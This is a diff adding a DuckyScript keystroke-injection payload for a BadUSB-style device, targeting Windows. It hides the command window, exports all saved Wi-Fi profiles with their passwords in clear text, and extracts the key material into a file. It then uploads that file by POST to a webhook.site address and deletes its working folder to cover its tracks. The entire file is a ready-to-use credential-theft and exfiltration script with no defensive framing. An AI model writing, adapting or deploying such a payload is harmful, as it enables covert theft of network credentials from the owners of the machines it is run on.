@@ -1,0 +1,32 @@
+DELAY 1500
+GUI r
+DELAY 300
+STRING cmd /k mode con cols=55 lines=1
+DELAY 300
+ENTER
+DELAY 700
+STRING mkdir %userprofile%\wifite && cd wifite && netsh wlan export profile key=clear
+DELAY 300
+ENTER
+DELAY 300
+STRING powershell Select-String -Path * -Pattern keymaterial > wifipass
+DELAY 300
+ENTER
+DELAY 300
+STRING powershell Invoke-WebRequest -Uri "webhook.site{}" -Method POST -InFile wifipass
+DELAY 300
+ENTER
+DELAY 300
+STRING cd ..
+DELAY 100
+ENTER
+DELAY 300
+STRING powershell rm wifite
+DELAY 100
+ENTER
+DELAY 150
+STRING T
+DELAY 100
+ENTER
+DELAY 300
+ALT F4
